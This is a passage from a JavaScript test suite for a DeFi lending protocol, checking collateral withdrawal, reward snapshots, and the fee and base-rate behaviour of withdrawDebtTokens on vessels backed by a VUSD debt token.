			// close Carol's Vessel, liquidating her 1 ether and 180VUSD.
			await vesselManagerOperations.liquidate(erc20.address, carol, { from: owner })

			const L_ASSET = await vesselManager.L_Colls(erc20.address)
			const L_VUSDDebt_Asset = await vesselManager.L_Debts(erc20.address)

			// check Alice and Bob's reward snapshots are zero before they alter their Vessels

			const alice_rewardSnapshot_Before_Asset = await vesselManager.rewardSnapshots(alice, erc20.address)
			const alice_ETHrewardSnapshot_Before_Asset = alice_rewardSnapshot_Before_Asset[0]
			const alice_VUSDDebtRewardSnapshot_Before_Asset = alice_rewardSnapshot_Before_Asset[1]

			const bob_rewardSnapshot_Before_Asset = await vesselManager.rewardSnapshots(bob, erc20.address)
			const bob_ETHrewardSnapshot_Before_Asset = bob_rewardSnapshot_Before_Asset[0]
			const bob_VUSDDebtRewardSnapshot_Before_Asset = bob_rewardSnapshot_Before_Asset[1]

			assert.equal(alice_ETHrewardSnapshot_Before_Asset, 0)
			assert.equal(alice_VUSDDebtRewardSnapshot_Before_Asset, 0)
			assert.equal(bob_ETHrewardSnapshot_Before_Asset, 0)
			assert.equal(bob_VUSDDebtRewardSnapshot_Before_Asset, 0)

			// Check A and B have pending rewards

			const pendingCollReward_A_Asset = await vesselManager.getPendingAssetReward(erc20.address, alice)
			const pendingDebtReward_A_Asset = await vesselManager.getPendingDebtTokenReward(erc20.address, alice)
			const pendingCollReward_B_Asset = await vesselManager.getPendingAssetReward(erc20.address, bob)
			const pendingDebtReward_B_Asset = await vesselManager.getPendingDebtTokenReward(erc20.address, bob)
			for (reward of [
				pendingCollReward_A_Asset,
				pendingDebtReward_A_Asset,
				pendingCollReward_B_Asset,
				pendingDebtReward_B_Asset,
			]) {
				assert.isTrue(reward.gt(toBN("0")))
			}

			// Alice and Bob withdraw from their Vessels
			const aliceCollWithdrawal = toBN(dec(5, "ether"))
			const bobCollWithdrawal = toBN(dec(1, "ether"))

			await borrowerOperations.withdrawColl(erc20.address, aliceCollWithdrawal, alice, alice, {
				from: alice,
			})
			await borrowerOperations.withdrawColl(erc20.address, bobCollWithdrawal, bob, bob, {
				from: bob,
			})

			// Check that both alice and Bob have had pending rewards applied in addition to their top-ups.

			const aliceCollAfter_Asset = await getVesselEntireColl(alice, erc20.address)
			const aliceDebtAfter_Asset = await getVesselEntireDebt(alice, erc20.address)
			const bobCollAfter_Asset = await getVesselEntireColl(bob, erc20.address)
			const bobDebtAfter_Asset = await getVesselEntireDebt(bob, erc20.address)

			// Check rewards have been applied to vessels

			th.assertIsApproximatelyEqual(
				aliceCollAfter_Asset,
				aliceCollBefore_Asset.add(pendingCollReward_A_Asset).sub(aliceCollWithdrawal),
				10000
			)
			th.assertIsApproximatelyEqual(aliceDebtAfter_Asset, aliceDebtBefore_Asset.add(pendingDebtReward_A_Asset), 10000)
			th.assertIsApproximatelyEqual(
				bobCollAfter_Asset,
				bobCollBefore_Asset.add(pendingCollReward_B_Asset).sub(bobCollWithdrawal),
				10000
			)
			th.assertIsApproximatelyEqual(bobDebtAfter_Asset, bobDebtBefore_Asset.add(pendingDebtReward_B_Asset), 10000)

			/* After top up, both Alice and Bob's snapshots of the rewards-per-unit-staked metrics should be updated
       to the latest values of L_ETH and L_VUSDDebt */

			const alice_rewardSnapshot_After_Asset = await vesselManager.rewardSnapshots(alice, erc20.address)
			const alice_ETHrewardSnapshot_After_Asset = alice_rewardSnapshot_After_Asset[0]
			const alice_VUSDDebtRewardSnapshot_After_Asset = alice_rewardSnapshot_After_Asset[1]

			const bob_rewardSnapshot_After_Asset = await vesselManager.rewardSnapshots(bob, erc20.address)
			const bob_ETHrewardSnapshot_After_Asset = bob_rewardSnapshot_After_Asset[0]
			const bob_VUSDDebtRewardSnapshot_After_Asset = bob_rewardSnapshot_After_Asset[1]

			assert.isAtMost(th.getDifference(alice_ETHrewardSnapshot_After_Asset, L_ASSET), 100)
			assert.isAtMost(th.getDifference(alice_VUSDDebtRewardSnapshot_After_Asset, L_VUSDDebt_Asset), 100)
			assert.isAtMost(th.getDifference(bob_ETHrewardSnapshot_After_Asset, L_ASSET), 100)
			assert.isAtMost(th.getDifference(bob_VUSDDebtRewardSnapshot_After_Asset, L_VUSDDebt_Asset), 100)
		})

		// --- withdrawDebtTokens() ---

		it("withdrawDebtTokens(): reverts when withdrawal would leave vessel with ICR < MCR", async () => {
			// alice creates a Vessel and adds first collateral

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(2, 18)),
				extraParams: { from: alice },
			})
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: bob },
			})

			// Price drops
			await priceFeed.setPrice(erc20.address, dec(100, 18))
			const price = await priceFeed.getPrice(erc20.address)

			assert.isFalse(await vesselManager.checkRecoveryMode(erc20.address, price))
			assert.isTrue((await vesselManager.getCurrentICR(erc20.address, alice, price)).lt(toBN(dec(110, 16))))

			const VUSDwithdrawal = 1 // withdraw 1 wei VUSD

			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, VUSDwithdrawal, alice, alice, {
					from: alice,
				}),
				"BorrowerOps: An operation that would result in ICR < MCR is not permitted"
			)
		})

		// Commented out as withdrawDebtTokens() has now a fixed fee
		/* it.skip("withdrawDebtTokens(): decays a non-zero base rate", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			const A_VUSDBal = await debtToken.balanceOf(A)
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D withdraws VUSD
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), A, A, {
				from: D,
			})
			// Check baseRate has decreased
			assert.isTrue(baseRate_2.lt(baseRate_1))
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_2_Asset.lt(baseRate_1_Asset))
			// 1 hour passes
			th.fastForwardTime(3600, web3.currentProvider)
			// E withdraws VUSD
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), A, A, {
				from: E,
			})
			assert.isTrue(baseRate_3.lt(baseRate_2))
			const baseRate_3_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_3_Asset.lt(baseRate_2_Asset))
		})
		it("withdrawDebtTokens(): reverts if max fee > 100%", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, dec(2, 18), dec(1, 18), A, A, {
					from: A,
				}),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(
					erc20.address,
					"1000000000000000001",
					dec(1, 18),
					A,
					A,
					{ from: A }
				),
				"Max fee percentage must be between 0.5% and 100%"
			)
		})
		it("withdrawDebtTokens(): reverts if max fee < 0.5% in Normal mode", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(10, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(20, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, 0, dec(1, 18), A, A, { from: A }),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, 1, dec(1, 18), A, A, { from: A }),
				"Max fee percentage must be between 0.5% and 100%"
			)
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, "4999999999999999", dec(1, 18), A, A, {
					from: A,
				}),
				"Max fee percentage must be between 0.5% and 100%"
			)
		})
		it("withdrawDebtTokens(): reverts if fee exceeds max fee percentage", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(60, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(60, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(70, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(80, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(180, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			const totalSupply = await debtToken.totalSupply()
			// Artificially make baseRate 5%
			assert.equal(baseRate, dec(5, 16))
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			let baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate_Asset, dec(5, 16))
			// 100%: 1e18,  10%: 1e17,  1%: 1e16,  0.1%: 1e15
			// 5%: 5e16
			// 0.5%: 5e15
			// actual: 0.5%, 5e15
			// VUSDFee:                  15000000558793542
			// absolute _fee:            15000000558793542
			// actual feePercentage:      5000000186264514
			// user's _maxFeePercentage: 49999999999999999
			const lessThan5pct = "49999999999999999"
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, lessThan5pct, dec(3, 18), A, A, {
					from: A,
				}),
				"Fee exceeded provided maximum"
			)
			assert.equal(baseRate, dec(5, 16))
			baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate_Asset, dec(5, 16))
			// Attempt with maxFee 1%
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 16), dec(1, 18), A, A, {
					from: B,
				}),
				"Fee exceeded provided maximum"
			)
			assert.equal(baseRate, dec(5, 16))
			baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate_Asset, dec(5, 16))
			// Attempt with maxFee 3.754%
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, dec(3754, 13), dec(1, 18), A, A, {
					from: C,
				}),
				"Fee exceeded provided maximum"
			)
			assert.equal(baseRate, dec(5, 16))
			baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate_Asset, dec(5, 16))
			// Attempt with maxFee 0.5%%
			await assertRevert(
				borrowerOperations.withdrawDebtTokens(erc20.address, dec(5, 15), dec(1, 18), A, A, {
					from: D,
				}),
				"Fee exceeded provided maximum"
			)
		})
		it("withdrawDebtTokens(): succeeds when fee is less than max fee percentage", async () => {
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(60, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(60, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(70, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(80, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(180, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			const totalSupply = await debtToken.totalSupply()
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			let baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.isTrue(baseRate.eq(toBN(dec(5, 16))))
			assert.isTrue(baseRate_Asset.eq(toBN(dec(5, 16))))
			// Attempt with maxFee > 5%
			const moreThan5pct = "50000000000000001"
			const tx1_Asset = await borrowerOperations.withdrawDebtTokens(
				erc20.address,
				moreThan5pct,
				dec(1, 18),
				A,
				A,
				{ from: A }
			)
			assert.isTrue(tx1.receipt.status)
			assert.isTrue(tx1_Asset.receipt.status)
			baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate, dec(5, 16))
			assert.equal(baseRate_Asset, dec(5, 16))
			// Attempt with maxFee = 5%
			const tx2_Asset = await borrowerOperations.withdrawDebtTokens(
				erc20.address,
				dec(5, 16),
				dec(1, 18),
				A,
				A,
				{ from: B }
			)
			assert.isTrue(tx2.receipt.status)
			assert.isTrue(tx2_Asset.receipt.status)
			baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate, dec(5, 16))
			assert.equal(baseRate_Asset, dec(5, 16))
			// Attempt with maxFee 10%
			const tx3_Asset = await borrowerOperations.withdrawDebtTokens(
				erc20.address,
				dec(1, 17),
				dec(1, 18),
				A,
				A,
				{ from: C }
			)
			assert.isTrue(tx3.receipt.status)
			assert.isTrue(tx3_Asset.receipt.status)
			baseRate_Asset = await adminContract.getBorrowingFee(erc20.address) // expect 5% base rate
			assert.equal(baseRate, dec(5, 16))
			assert.equal(baseRate_Asset, dec(5, 16))
			// Attempt with maxFee 37.659%
			const tx4_Asset = await borrowerOperations.withdrawDebtTokens(
				erc20.address,
				dec(37659, 13),
				dec(1, 18),
				A,
				A,
				{ from: D }
			)
			assert.isTrue(tx4.receipt.status)
			assert.isTrue(tx4_Asset.receipt.status)
			// Attempt with maxFee 100%
			const tx5_Asset = await borrowerOperations.withdrawDebtTokens(
				erc20.address,
				dec(1, 18),
				dec(1, 18),
				A,
				A,
				{ from: E }
			)
			assert.isTrue(tx5.receipt.status)
			assert.isTrue(tx5_Asset.receipt.status)
		})
		it("withdrawDebtTokens(): doesn't change base rate if it is already zero", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: E },
			})
			// Check baseRate is zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			// assert.equal(baseRate_1, "0")
			assert.equal(baseRate_1_Asset, "0")
			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)
			// D withdraws VUSD
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(37, 18), A, A, {
				from: D,
			})
			// Check baseRate is still 0
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_2, "0")
			assert.equal(baseRate_2_Asset, "0")
			// 1 hour passes
			th.fastForwardTime(3600, web3.currentProvider)
			// E opens vessel
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(12, 18), A, A, {
				from: E,
			})
			const baseRate_3_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.equal(baseRate_3, "0")
			assert.equal(baseRate_3_Asset, "0")
		})
		it("withdrawDebtTokens(): lastFeeOpTime doesn't update if less time than decay interval has passed since the last fee operation", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			const lastFeeOpTime_1_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// 10 seconds pass
			th.fastForwardTime(10, web3.currentProvider)
			// Borrower C triggers a fee
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), C, C, {
				from: C,
			})
			const lastFeeOpTime_2_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Check that the last fee operation time did not update, as borrower D's debt issuance occured
			// since before minimum interval had passed
			assert.isTrue(lastFeeOpTime_2.eq(lastFeeOpTime_1))
			assert.isTrue(lastFeeOpTime_2_Asset.eq(lastFeeOpTime_1_Asset))
			// 60 seconds passes
			th.fastForwardTime(60, web3.currentProvider)
			// Check that now, at least one minute has passed since lastFeeOpTime_1
			const timeNow = await th.getLatestBlockTimestamp(web3)
			assert.isTrue(toBN(timeNow).sub(lastFeeOpTime_1).gte(60))
			assert.isTrue(toBN(timeNow).sub(lastFeeOpTime_1_Asset).gte(60))
			// Borrower C triggers a fee
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), C, C, {
				from: C,
			})
			const lastFeeOpTime_3_Asset = await vesselManager.lastFeeOperationTime(erc20.address)
			// Check that the last fee operation time DID update, as borrower's debt issuance occured
			// after minimum interval had passed
			assert.isTrue(lastFeeOpTime_3.gt(lastFeeOpTime_1))
			assert.isTrue(lastFeeOpTime_3_Asset.gt(lastFeeOpTime_1_Asset))
		})
		it("withdrawDebtTokens(): borrower can't grief the baseRate and stop it decaying by issuing debt at higher frequency than the decay granularity", async () => {
			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)
			// Check baseRate is now non-zero
			// assert.isTrue(baseRate_1.gt(toBN("0")))
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))
			// 30 seconds pass
			th.fastForwardTime(30, web3.currentProvider)
			// Borrower C triggers a fee, before decay interval has passed
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), C, C, {
				from: C,
			})
			// 30 seconds pass
			th.fastForwardTime(30, web3.currentProvider)
			// Borrower C triggers another fee
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(1, 18), C, C, {
				from: C,
			})
			// Check base rate has decreased even though Borrower tried to stop it decaying
			const baseRate_2_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_2.lt(baseRate_1))
			assert.isTrue(baseRate_2_Asset.lt(baseRate_1_Asset))
		}) */

		it("withdrawDebtTokens(): borrowing at non-zero base rate sends fee to GRVT staking contract", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT VUSD balance before == 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStaking_VUSDBalance_Before, "0")

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D withdraws VUSD
			await borrowerOperations.withdrawDebtTokens(erc20.address, dec(37, 18), C, C, {
				from: D,
			})

			// Check GRVT VUSD balance after has increased
			assert.equal(await borrowerOperations.feeCollector(), feeCollector.address)
			assert.equal(await feeCollector.grvtStaking(), grvtStaking.address)
			const GRVTStaking_VUSDBalance_After = await debtToken.balanceOf(grvtStaking.address)
			assert.isTrue(GRVTStaking_VUSDBalance_After.gt(GRVTStaking_VUSDBalance_Before))
		})

		if (!withProxy) {
			// TODO: use rawLogs instead of logs
			it("withdrawDebtTokens(): borrowing at non-zero base records the (drawn debt + fee) on the Vessel struct", async () => {
				// time fast-forwards 1 year, and multisig stakes 1 GRVT
				await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
				await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
				await grvtStaking.stake(dec(1, 18), { from: multisig })

				await openVessel({
					asset: erc20.address,
					ICR: toBN(dec(10, 18)),
					extraParams: { from: whale },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(30, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: A },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(40, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: B },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(50, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: C },
				})
				await openVessel({
					asset: erc20.address,
					extraVUSDAmount: toBN(dec(50, 18)),
					ICR: toBN(dec(2, 18)),
					extraParams: { from: D },
				})

				const D_debtBefore_Asset = await getVesselEntireDebt(D, erc20.address)

				// Artificially make baseRate 5%
				// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
				// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

				// Check baseRate is now non-zero
				const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)

				assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

				// 2 hours pass
				th.fastForwardTime(7200, web3.currentProvider)

				// D withdraws VUSD
				const withdrawal_D = toBN(dec(37, 18))
				const withdrawalTx_Asset = await borrowerOperations.withdrawDebtTokens(erc20.address, toBN(dec(37, 18)), D, D, {
					from: D,
				})

				const emittedFee_Asset = toBN(th.getVUSDFeeFromVUSDBorrowingEvent(withdrawalTx_Asset))
				assert.isTrue(emittedFee_Asset.gt(toBN("0")))

				const newDebt_Asset = (await vesselManager.Vessels(D, erc20.address))[th.VESSEL_DEBT_INDEX]

				// Check debt on Vessel struct equals initial debt + withdrawal + emitted fee

				th.assertIsApproximatelyEqual(newDebt_Asset, D_debtBefore_Asset.add(withdrawal_D).add(emittedFee_Asset), 10000)
			})
		}

		it("withdrawDebtTokens(): borrowing at non-zero base rate increases the GRVT staking contract VUSD fees-per-unit-staked", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT contract VUSD fees-per-unit-staked is zero
			const F_VUSD_Before = await grvtStaking.F_DEBT_TOKENS()
			assert.equal(F_VUSD_Before, "0")

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Artificially make baseRate 5%

			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			// D withdraws VUSD
			await borrowerOperations.withdrawDebtTokens(erc20.address, toBN(dec(37, 18)), D, D, {
				from: D,
			})

			// Check GRVT contract VUSD fees-per-unit-staked has increased
			const F_VUSD_After = await grvtStaking.F_DEBT_TOKENS()
			assert.isTrue(F_VUSD_After.gt(F_VUSD_Before))
		})

		it("withdrawDebtTokens(): borrowing at non-zero base rate sends requested amount to the user", async () => {
			// time fast-forwards 1 year, and multisig stakes 1 GRVT
			await th.fastForwardTime(timeValues.SECONDS_IN_ONE_YEAR, web3.currentProvider)
			await grvtToken.approve(grvtStaking.address, dec(1, 18), { from: multisig })
			await grvtStaking.stake(dec(1, 18), { from: multisig })

			// Check GRVT Staking contract balance before == 0
			const GRVTStaking_VUSDBalance_Before = await debtToken.balanceOf(grvtStaking.address)
			assert.equal(GRVTStaking_VUSDBalance_Before, "0")

			await openVessel({
				asset: erc20.address,
				ICR: toBN(dec(10, 18)),
				extraParams: { from: whale },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(30, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: A },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(40, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: B },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: C },
			})
			await openVessel({
				asset: erc20.address,
				extraVUSDAmount: toBN(dec(50, 18)),
				ICR: toBN(dec(2, 18)),
				extraParams: { from: D },
			})

			// Artificially make baseRate 5%
			// await vesselManager.setBaseRate(erc20.address, dec(5, 16))
			// await vesselManager.setLastFeeOpTimeToNow(erc20.address)

			// Check baseRate is now non-zero
			const baseRate_1_Asset = await adminContract.getBorrowingFee(erc20.address)
			assert.isTrue(baseRate_1_Asset.gt(toBN("0")))

			// 2 hours pass
			th.fastForwardTime(7200, web3.currentProvider)

			let D_VUSDBalanceBefore = await debtToken.balanceOf(D)

			// D withdraws VUSD
			const D_VUSDRequest = toBN(dec(37, 18))
			await borrowerOperations.withdrawDebtTokens(erc20.address, D_VUSDRequest, D, D, {
